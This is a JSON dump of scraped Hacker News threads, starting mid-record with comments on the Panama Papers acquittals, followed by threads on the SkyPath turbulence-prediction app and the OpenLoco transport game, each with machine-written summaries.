through things like the various schemes and contracts related to pandemics, climate change, bailouts, welfare/social services, healthcare, immigration, war, etc. If people wanted to solve this problem, we would need to make all of the things that benefit the wealthy financially but cost the rest of the people immensely, directly payable through direct taxes on income and wealthy of those most responsible and able to affect those matters, i.e., the upper neo-aristocracy. For example; all the people who benefited most from all the pollution, should now not also be able to profit from the prescribed solutions to the consequences of their actions that just happen to also make them even more absurdly wealthy. Even more unfortunate though is that many, if not most regular people simply do not understand the abusive relationship they are in with the upper class, so they’ll rationalize and excuse and justify all day long until the cows come home when someone wants to explain to them that being beaten, lied to, and exploited by the upper class is not a sign of love. reply electric_mayhem 4 hours agorootparentSounds like you and I are in violent agreement. Though I dislike that you seem to begin with halfway lumping me in with the lot you go on to describe. I’d offer one other dark pattern in the overall dynamic. Some folks, rather than being in denial about their being on the victim end of an abusive relationship, appear to be 100% ok with it as long as they themselves get to bully and exploit others lower down in the hierarchy. reply realusername 5 hours agoprev> A Panamanian court Yeah I mean, that's not like they have a real legal system anyways, the whole purpose of the place is to stash funds. reply speed_spread 5 hours agoparentAnd move boats from one ocean to another reply highcountess 5 hours agoprev [–] “Ukraine's President Volodymyr Zelensky […] were among those whose affairs came under scrutiny following the leak.” … and then we gave him $600 Billion of our citizens’ money. reply cen4 5 hours agoparent [–] You can see who funded his election. The thing about taking on the Elites, is you end up selling your soul to other Elites. There is no prosecution of the Elites. There is just a Circulation of Elites as Pareto showed us a century ago. reply 93po 4 hours agorootparent [–] Elites get prosecuted when they've sufficiently pissed off or stolen from other elites reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "A Panamanian court has acquitted all 28 individuals charged with money laundering in the Panama Papers scandal, citing insufficient evidence to prove criminal responsibility.",
      "Among those acquitted were Jurgen Mossack and the late Ramon Fonseca, founders of the law firm Mossack Fonseca, which was central to the 2016 leak exposing the use of tax havens by the wealthy.",
      "The trial, which lasted 85 hours and included testimony from 27 witnesses, was dismissed partly because evidence from Mossack Fonseca's servers was not collected properly."
    ],
    "commentSummary": [
      "A Panamanian judge dismissed money laundering charges against 28 individuals linked to the Panama Papers leak, but this decision is specific to Panama.",
      "The legal system in Panama is more favorable to such schemes, unlike other countries where prosecutions continue, including successful cases in the US.",
      "The Panama Papers leak led to significant global actions, including the closure of Mossack Fonseca and various international investigations and recoveries."
    ],
    "points": 106,
    "commentCount": 44,
    "retryCount": 0,
    "time": 1719661444
  },
  {
    "id": 40828180,
    "title": "Safe Routes. real time turbulence data, ML predictions with an iPad",
    "originLink": "https://skypath.io",
    "originBody": "Start a Trial Login Open main menu SkyPath, Your Ride Quality Partner Guiding you in Navigating Turbulence. Unveiling the Safest Routes. Utilizing up-to-the-minute turbulence data, PIREP reports, and ML predictions. Start a Trial Free trialExceptional SupportZero Integration Turbulence is the most common airline accident type today and it’s time we reduce turbulence-related injuries . NTSB Chairman (2021) Bruce Landsberg How it works Improvements all across the board Optimize Safety, Maintenance, Fuel Consumption and Your Budget Improved Safety Providing pilots with early notifications about imminent turbulence grants them the ability to make informed decisions and take timely actions, ensuring the safety of everyone on board. Efficient Maintenance With turbulence accurately measured, maintenance can validate precise turbulence records and determine necessary actions, effectively eliminating redundant inspections. Fuel Savings Skypath allows pilots to safely navigate rapidly emerging turbulence situations, offering potential cost savings through efficient dispatch routing, informed contingency fuel decisions, and minimized in-flight altitude adjustments. Optimized Budget Anticipate a significant boost to your bottom line. Experience savings across insurance claims, maintenance, and fuel expenditures. Annual recorded turbulence reports 0 million Annual pilot notifications 0 million Subscribers 0 What Pilots say about SkyPath “Just wanted to let you know that the SkyPath app is excellent! I love the app because it’s real time and allows you the ability to select rides. This is one of the best tools we have!” B737 First Officer “Love the app. I’ve found it to be the most accurate tool I have for predicting turbulence” A319 Captain “Mind blown! Thank you for this app. Used it yesterday for the first time and within 10 minutes I realized there was no reason to ask ATC for a ride report.” A320 Captain “Thanks for being innovative and making a great tool to enhance safety for our crews and passengers” A320 Captain “it has helped us avoid bad turbulence many times. Thank you!” B787 First Officer SkyPath is an ecosystem As an app, web, or integrated to other common platforms via REST APIs and SDK SkyPath for Pilots Elevate pilot capabilities with up-to-the-minute turbulence and PIREP insights, granting the power to navigate flights with informed confidence SkyPath for Dispatchers Improve route planning capabilities and streamline route monitoring with our dedicated dispatchers' web platform. SkyPath for Management Use SkyPath analytics and debrief capabilities to gain insights out of turbulence events, airline usage and the most turbulent routes. Zero integration efforts Just download the app and start flying: Start a Trial Learn more → Footer Company About Us Contact Us Careers Trust Center Discover SkyPath App Blog Newsroom API Docs iOS SDK Docs Service Status Legal Terms of Use Privacy Policy Solutions FAQ Pilot Dispatch Management LinkedIn © 2023 SkyPath. All Rights Reserved.",
    "commentLink": "https://news.ycombinator.com/item?id=40828180",
    "commentBody": "Safe Routes. real time turbulence data, ML predictions with an iPad (skypath.io)101 points by oron 13 hours agohidepastfavorite51 comments turrican 3 hours agoYou guys have a great product, I fly for a major airline and really like it. Hurry up and get Delta onboard so we can get their data too: I’ve used their in-house app at my old job and Sky Vector is much better. Any plans to change the Jepp integration? Most of my colleagues don’t use it, too much data displayed at once. I’m not sure of a solution but would love to hear if you guys have any ideas. reply oron 3 hours agoparentThank you. We are actively working to onboard as many airlines as possible, and partnering with Delta would be highly beneficial. The more data we have, the safer and more efficient flights become. Regarding the integration with Jeppesen, we would greatly appreciate hearing more about any issues you encounter and receiving your feedback reply oron 13 hours agoprevAt SkyPath we have a simple solution that doesn't involve installing any HW on the aircraft and uses the airline issued iPad the pilot already uses for other important tasks to help fight Clear Air Turbulence. We use the iPad's accelerometers to measure and report turbulence in real time and collect this data via the internet where it's processed in AWS by our machine learning model to produce customized alerts for each flight that uses our service on incoming CATs in their route. reply btgeekboy 4 hours agoparentDidn’t ForeFlight just come out with something similar recently? https://blog.foreflight.com/2024/05/07/smooth-skies/ They don’t mention ML specifically, but I imagine their install base is a tad larger and can therefore gather more real data. Is your solution different? reply oron 3 hours agorootparentWe have a partnership with Jeppesen, a Boeing company, for their Flight Deck Pro product. With this collaboration, users can access our data layer and predictions, and also report real-time turbulence within their app. While I'm not extensively familiar with the inner workings of ForeFlight, based on what I've heard, it relies on an external hardware solution, and its coverage and quality are not comparable reply buildsjets 3 hours agorootparentprevNote that Foreflight is a Boeing product. Therefore they could potentially have access to actual real-time aircraft data that this product would not. reply oron 3 hours agorootparentOur solution is compatible with Airbus, Boeing, or any other aircraft. It's important to note that connecting to the aircraft systems can be more expensive and add maintenance and complexity costs for the airline. reply ammmir 12 hours agoparentprevamazing! it seems like much of the innovation on the flight deck is happening in iPad apps. i'm curious, in the beginning, before you had so many users of the app, how did you convince pilots/airlines to install SkyPath before it had enough user-generated turbulence data for its ML model? it almost feels like a chicken-and-the-egg problem: you need enough reports before it's useful around the world at all imaginable air routes, or maybe there's enough air/wind data. interesting stuff! reply oron 12 hours agorootparentWe had to give incentives for the first airline partners and give the product for free for a long trial period at the early years to be able to have initial installs. It was a long ride including Covid which came in the middle and didn't help. In the last years since we have several big airline partners this is less of a problem. reply mayasp 12 hours agorootparentprevThe effect on the route is immediate. There is no installation or integration so the moment you deploy (with a reasonable fleet size) you have data. Those that where quick to understand the concept embraced technology very fast even without initial data set in the route reply tedd4u 5 hours agoparentprevDoes your app have to run in the foreground on the iPad during the flight? Or can the crew user other apps in flight? reply oron 5 hours agorootparentCan run in the background, pilot can use any other app meanwhile. Or just leave the iPad with screen off. Our app keeps recording and alerting as long as you are in flight. reply hollerith 4 hours agorootparentI'm assuming that the most valuable data for predicting turbulence during a flight is timely data from the accelerometers of the iPads on nearby airliners, which gets me curious as to whether these iPads usually have connectivity (to your AWS servers) during a flight, and how that connectivity is provided. (I'm guessing satellite.) reply oron 3 hours agorootparentYes, satellite internet is now standard on many Western airlines. In addition to this, we utilize weather data and real-time turbulence reports to predict Clear Air Turbulence (CAT) events across the entire sky, even where iPads are currently not on flights. reply tobr 12 hours agoparentprevWhat goes into developing, testing, calibrating something like this? reply oron 12 hours agorootparentApart from usual SW tests, Lots of testing with airlines and experienced pilots. Processing feedback and improving the model step by step over the course of several years. reply nerdponx 6 hours agorootparentI'm very curious how you \"bootstrap\" a model like that. Do you start with a physics simulation? Make an educated guess and then get pilots to label when it's wrong in order to incrementally improve? Recruit pilots to manually track CAT events? I've had to build a few of these kinds of models over the years, and it's consistently the hardest task I've faced in my DS career. reply oron 5 hours agorootparentThe second is closer to reality , initially let pilots (lots of them) label flight events and after landing take all data and build the algorithm around their initial labels. The when there are more pilots let them label agree / disagree and relabel etc. Another aspect is you have usually two iPads in the cockpit for captain and first officer so you can correlate and match what both accelerometers read. reply nerdponx 3 hours agorootparentThanks! It's nice validation to know that my approach to this kind of problem similar to that of a successful AI startup. reply mayasp 12 hours agorootparentprevIpad accelerometers and GPS reply vivzkestrel 9 hours agoparentprevhow exactly are you using an accelerometer to determine turbulence reply oron 8 hours agorootparentBy analyzing the acceleration patterns that the iPad the pilot has in the cockpit which is securely attached to the aircraft is measuring. Cleaning out noise such as engine and other non CAT noise and training our model to identify these and also predict future events in the next 3 hours by looking at the current data. It takes millions of events and lots of pilots which help train the initial model and fine tune it. reply sigmoid10 8 hours agorootparentprevHow else would you detect it? Accelerometers seem perfect for this use case. reply TheJoeMan 2 hours agoprevAnecdote: I recently flew from Texas to Florida, and the pilot requested a reroute south around Louisiana to avoid a storm cell. ATC denied reroute due to “staffing shortage” and forced us into an extremely uncomfortable ride. I’ve been hearing about statistics for turbulence incidences increasing, and wonder if this type of thing is a contributing factor. With this app you’d get a warning but I wonder if you could do anything about it. reply oron 2 hours agoparentGood question, turning on the seatbelt sign in this case is a good start. reply e12e 1 hour agoprevCool product. If it helps most flights avoid turbulence - how will you continue to record areas with turbulence? :) Or is the steady state simply clear flight paths with continuous adjustments as the clear paths drift? reply oron 52 minutes agoparentTypically, flights do not deviate from their planned routes for non-severe turbulence levels. It's safer and simpler to have passengers remain seated with the seatbelt sign on. Our model considers weather inputs alongside real-time data, acknowledging that weather is continuously changing and somewhat unpredictable. Therefore, we don't perceive this issue as significant reply ed_db 7 hours agoprevHow do you eliminate false positives from pilot usage of the device or knocking into it? I wonder how long it will be before flight insurers start using this data for hedging following the Singapore Airlines flight SQ321 turbulence incident. reply oron 7 hours agoparentValid observation: turbulence patterns differ from pilot tapping and can be recognized and disregarded. While complete elimination of false positives isn't always feasible, employing various techniques allows us to significantly minimize such occurrences, thereby mitigating their impact. reply scottmcdot 11 hours agoprevOut of curiosity, was this product a result of a company 'pivot' after the Singapore Airlines flight SQ321 turbulence incident? reply oron 11 hours agoparentNope, company was started by commercial / ex-military pilots who scratched their own itch and still today is run by pilots :-) reply VBprogrammer 11 hours agoprevFrom the testimonials it seems this is used for tactical rather than strategic planning. Honestly, that would keep me up at night. It's similar to problems which have been previously caused by a reliance on in cockpit weather data delivered by satellites. At worst it can be 15 minutes out of date and more than one eager light aircraft pilot has flown into the center of a storm cell which wasn't there 15 minutes ago - taking his family with him. Its only turbulence but worst case scenario with turbulence is still pretty bad - injuries and even deaths are completely possible outcomes. reply oron 10 hours agoparentGood comment! our algorithms take into account time of report as recorded by the aircraft so latency or offline aircraft is not an issue. Surprisingly most CAT phenomena is pretty stable and can stay in the same area for hours at time. reply VBprogrammer 8 hours agorootparentThanks for responding. That is interesting. I guess you also have the advantage that current \"state of care\" is sharing a few radio messages with other aircraft with lots of subjective judgements. reply lawrenceduk 4 hours agorootparentprevMostly mountain wave presumably? reply smithcoin 11 hours agoprevDo you offer turbulence predictions for consumers? I’m scared of flying and would love to know if my ride will be smooth. reply Ylpertnodi 6 hours agoparentDon't be scared of flying, be scared of crashing. Crashing doesn't happen that often. Try watching/downloading flightradar24 - the sheer number of flights is staggering. Then multiply them by the number of days since you can (without assistance) actually remember hearing about a plane crash. reply havaloc 5 hours agoparentprevMy site focuses on the consumer side and does just that: https://turbulenceforecast.com reply oron 4 hours agorootparentnice work! where is the data coming from? reply oron 11 hours agoparentprevRight now flight predictions and route quality are offered only to pilots who are operating the flight and to dispatchers. There are discussions with the airlines to integrate our technology into their apps but at the moment there is no such solution available. reply qwertyuiop_ 6 hours agoprevHow does the app connect to the aircraft’s internet during flight ? reply oron 5 hours agoparentCockpit WiFi that's open only for the crew. reply culopatin 5 hours agorootparentDoes the crew also lose internet when flying over the arctic circle? reply oron 4 hours agorootparentIt depends on the provider that the airline has partnered with, I suppose. We don't manage the satellite connectivity, so I can't provide specifics on that. However, in areas with fewer ground stations, disruptions are more likely. Our app and servers are designed to function effectively on unreliable internet connections. it downloads prediction data for several hours ahead and is capable of uploading turbulence data once the internet connection stabilizes. reply culopatin 4 hours agorootparentIn my last flight the disconnection over the arctic circle lasted about 5hs. Is the data still relevant then? Does turbulence happen in cycles and is predictable that way? reply oron 3 hours agorootparentFive hours is a bit long; you can choose in the app how far ahead you would like to see. We typically recommend looking two hours ahead. This way, for the initial two hours, you'll have some data that may be partially outdated but still better than having no information at all. reply sandworm101 6 hours agoprevForget any app. Just put on your seatbelt. If you are wearing a seatbelt, the worst that will happen is spilled coffee. I cannot stand the sound of a hundred belts unclicking all at once the moment the seatbelt sign turns off. Idiots. The presence of a seatbelt across one's lap is the least of the various tortures associated with modern air travel. reply oron 4 hours agoparentSome of the most severe injuries occur among crew members because they must rush to secure passengers in their seats, often being the last to fasten their own seat belts. Additionally, when turbulence reaches a certain intensity, the aircraft must undergo costly structural testing on the ground, which disrupts the airline's schedule significantly. reply pavel_lishin 4 hours agoparentprevTo be absolutely pedantic, the worst that will happen is the unbuckled dingdong sitting next to you becoming a loose item and banging into you. reply julienreszka 9 hours agoprev [–] Why not say who this is for? reply oron 9 hours agoparent [–] This solution is for commercial airlines, pilots and dispatchers and for general and business aviation. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "SkyPath offers a real-time turbulence prediction app using data, PIREP (Pilot Reports), and machine learning to enhance flight safety and efficiency.",
      "Benefits include early turbulence notifications, accurate maintenance records, fuel savings, and cost reductions in insurance and maintenance.",
      "The app is praised by pilots for its accuracy and ease of use, requiring no integration efforts—just download and start using."
    ],
    "commentSummary": [
      "SkyPath provides real-time turbulence data and machine learning (ML) predictions via iPad, utilizing accelerometers and AWS for data processing.",
      "Pilots find the app beneficial, and there is growing interest in integrating it with more airlines, such as Delta.",
      "The app, which can run in the background using satellite internet, improves with pilot feedback and data correlation, enhancing flight safety and efficiency."
    ],
    "points": 101,
    "commentCount": 51,
    "retryCount": 0,
    "time": 1719640562
  },
  {
    "id": 40827586,
    "title": "OpenLoco: Modern, open source version of the classic transport simulation game",
    "originLink": "https://openloco.io/",
    "originBody": "Screenshot galleryPermalink",
    "commentLink": "https://news.ycombinator.com/item?id=40827586",
    "commentBody": "OpenLoco: Modern, open source version of the classic transport simulation game (openloco.io)94 points by thunderbong 15 hours agohidepastfavorite32 comments jordandreassen 13 hours agoThis is cool, I've played Locomotion a lot and OpenTTD never did it for me. I find myself sticking to these old games even though there seems to be attempts to release new games in these genres, maybe its the limited nature of computing power at time of release that makes these games the right amount of complexity, as there was only so much a game could offer. reply KronisLV 6 hours agoparentI really like some of the modern games, though, they often bring both great UI/UX as well as nice graphics to the table! Mashinky: https://store.steampowered.com/app/598960/Mashinky/ (a pretty nice indie game) Transport Fever: https://store.steampowered.com/app/446800/Transport_Fever/ (runs well, affordable, lots of content) Transport Fever 2: https://store.steampowered.com/app/1066780/Transport_Fever_2... (hands down the best UI/UX in any game like this) Workers & Resources: https://store.steampowered.com/app/784150/Workers__Resources... (a whole city builder, with resource management) That said, for what it's worth, OpenTTD and games like it are quite good, if you can figure out the font scaling and UI. Oh, also some enjoy Simutrans, albeit it's a bit different: https://www.simutrans.com/en/ reply arp242 3 hours agorootparentI'm not a big fan of all this 3D stuff; for a lot of games of this kind I much prefer 2D. I feel the UI of the original Transport Tycoon aged fairly well, although I agree it's not perfect. On a related note: I played Settlers 2 for the first time in >20 years a few months back, and I was amazed how well the UI worked for a 1996 game. reply InsideOutSanta 9 hours agoparentprevSame. Games like Sim City or Theme Park were limited by the hardware to the point where they couldn't overwhelm you with features and details and complex simulations. They felt more like puzzle games than genuine simulators, which made them better videogames in my opinion. reply tux1968 11 hours agoprevChris Sawyer's Locomotion, is on sale for 60% off ($2.59 CAD) right now on Steam. It's a good time to grab the assets you'll need if you want to play OpenLoco. reply clan 11 hours agoparentAnd 80% off on GOG: https://www.gog.com/game/chris_sawyers_locomotion reply zokier 11 hours agoprevIt's curious that despite trains and rail networks being a perennial nerdy favorite, the simulation game selection feels somewhat limited. For example is there any that simulate real-world signaling systems, such as ETCS or it's national peers? Or are the different systems truly so generic that you can just substitute them with generic signaling mechanisms? Recently I've been playing Factorio and the trains are fun challenge there, but the tools to build/design/analyze rail networks feel very limited (at least in vanilla base game). So now I kinda have bit of an itch for better rail game but haven't found one yet. And from the looks of it I don't think Locomotion is it either reply lookatme 8 hours agoparentI think TS2 fits the bill of what you're describing. https://ts2.github.io/ reply Ringz 8 hours agoparentprevDon’t know about ETCS but I find the options to work with signals in OpenTTD quite satisfying. https://wiki.openttd.org/en/Manual/Signals reply mindcrash 1 hour agorootparentAnd things get _even_ better with a additional patchpack like the one from JGR (https://github.com/JGRennison/OpenTTD-patches/releases) reply taejo 7 hours agoprevSince we're nostalging about old train software, I'll mention JB BAHN https://jbss.de/hpg_eng.htm It's more simulator than game but I had a lot of fun with it as a kid reply cglong 10 hours agoprevIn the 90s, I played a computer game whose name I haven't been able to remember. You built railroad tracks and trains would pass through your town(?). I'm pretty sure it was played from a top-down view and the terrain was gray, but honestly the main thing I remember is how, on holidays like Halloween, all the assets automatically changed to suit. I don't suppose this is familiar to anyone :) reply ertian 8 hours agoparentPossibly A-Train? The assets would change for special occasions in that. reply InsideOutSanta 9 hours agoparentprevSounds like Transport Tycoon. reply greenblue 9 hours agoprevI wonder why this reimplementation doesn't go for 64-bit, and instead require 32-bit libraries dependencies. reply sweetgiorni 1 hour agoparentLooks like it makes heavy use of the original binary. https://github.com/OpenLoco/OpenLoco/blob/master/src/Interop... reply manuelisimo 14 hours agoprevThe name sounds crazy if you speak Spanish reply mig39 14 hours agoprevI love these modern versions of old favourites. I've been playing Transport Tycoon all day today. https://openttd.org reply bayesianbot 14 hours agoparentI have played neither of the originals or the open source ones but I really liked Factorio and building traffic in city-building games (even though I feel they're too limited). Which one should I spend some time on, OpenLoco or OpenTTD? reply hebocon 13 hours agorootparentOpenTTD. Been playing off and on since 2004 and still improving! It's a fantastic playground to try coding a bot, drawing graphics, scenario design, or just building the transport network of your dreams (or nightmares). OpenRCT2 is a close second. reply tasuki 11 hours agorootparentThe thing I don't get about OpenTTD: the passengers don't seem to care where you're taking them? In what way is it fun to build networks to solve the problem of \"take passengers wherever, they don't care\"? I have enjoyed Simutrans, where passengers have desired destinations and use your service if you can take them there. They can change between different transports too. This often creates choke points. For me, that makes the game interesting. reply bramblerose 11 hours agorootparentYou can, but you need to enable it (as it fundamentally changes how the game plays); https://wiki.openttd.org/en/Manual/Passenger%20and%20cargo%2... reply sebazzz 10 hours agorootparentprevOpenLoco, it has slightly more modern mechanics and graphics. OpenTDD truly looks like an old-old game. reply edgarvaldes 12 hours agoparentprevReminds me of OpenMW reply butz 8 hours agoprevIs anyone crazy enough to merge OpenLoco and OpenRCT2 into single experience? reply joelthelion 13 hours agoprevWhat does it bring over open ttd? reply ninjin 13 hours agoparentLocomotion had more of a RollerCoaster Tycoon feel to it if I recall. It was also more scenario driven (much like RCT) than Transport Tycoon was, which was essentially a sandbox. I also recall the engine being far more sophisticated, with more physics going into say curve taking and acceleration. Personally, it was not my cup of tea in 2004 and I always stuck to the original (which I think was/is the popular opinion of the game) and I in particular dislike the complexity of RCT and Locomotion's construction UI compared to TT. But I do think Locomotion has some charm and perhaps is best viewed not as a sequel, but a different take on what TT could have been. reply innocenat 13 hours agoparentprevDiagonal bridge, for one. reply coolgoose 13 hours agoparentprevIt's a different base game for each project, so not sure I get the question :) reply tiku 13 hours agoprev [–] I'll stick to OpenTtd. reply tasuki 11 hours agoparent [–] Why? reply em-bee 9 hours agorootparent [–] for one because it doesn't require you to buy the original game in order to use its assets. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "OpenLoco is a modern, open-source version of the classic transport simulation game, Locomotion, appealing to fans of simpler, older games.",
      "Discussions highlight comparisons with other transport simulation games like OpenTTD, noting differences in complexity, UI/UX, and game mechanics.",
      "OpenLoco retains the original binary heavily, which raises questions about its use of 64-bit libraries and modern mechanics."
    ],
    "points": 94,
    "commentCount": 32,
    "retryCount": 0,
    "time": 1719630309
  }
]
